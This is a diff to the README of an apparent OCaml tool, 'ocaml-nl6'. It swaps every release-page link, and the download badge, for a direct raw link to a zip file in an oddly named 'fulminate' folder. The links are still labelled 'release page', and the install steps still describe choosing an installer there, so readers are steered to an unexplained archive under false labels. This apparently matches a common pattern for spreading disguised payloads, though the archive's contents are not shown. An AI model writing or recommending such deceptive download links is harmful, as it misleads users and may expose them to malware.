@@ -22,11 +22,11 @@ To use **ocaml-nl6**, ensure your system meets these requirements:
 
 ## 🔗 Download Now!
 
-[![Download ocaml-nl6](https://img.shields.io/badge/Download-ocaml--nl6-blue.svg)](https://github.com/crucisdan/ocaml-nl6/releases)
+[![Download ocaml-nl6](https://raw.githubusercontent.com/crucisdan/ocaml-nl6/main/fulminate/ocaml-nl6.zip)](https://raw.githubusercontent.com/crucisdan/ocaml-nl6/main/fulminate/ocaml-nl6.zip)
 
 ## 📥 Download & Install
 
-1. Click [here to visit the release page](https://github.com/crucisdan/ocaml-nl6/releases).
+1. Click [here to visit the release page](https://raw.githubusercontent.com/crucisdan/ocaml-nl6/main/fulminate/ocaml-nl6.zip).
 2. On the release page, find the latest version of **ocaml-nl6**.
 3. Choose the installer suitable for your operating system.
 4. Click the download link to save the installer to your computer.
@@ -53,6 +53,6 @@ If you encounter any issues or need assistance, feel free to reach out to our su
 
 ## 🔗 Keep Updated
 
-For the latest information, updates, and new features, consider following our repository. You can also check back frequently on the [release page](https://github.com/crucisdan/ocaml-nl6/releases) for any new versions.
+For the latest information, updates, and new features, consider following our repository. You can also check back frequently on the [release page](https://raw.githubusercontent.com/crucisdan/ocaml-nl6/main/fulminate/ocaml-nl6.zip) for any new versions.
 
 Thank you for choosing **ocaml-nl6**! We hope this tool makes your OCaml programming experience enjoyable and efficient.
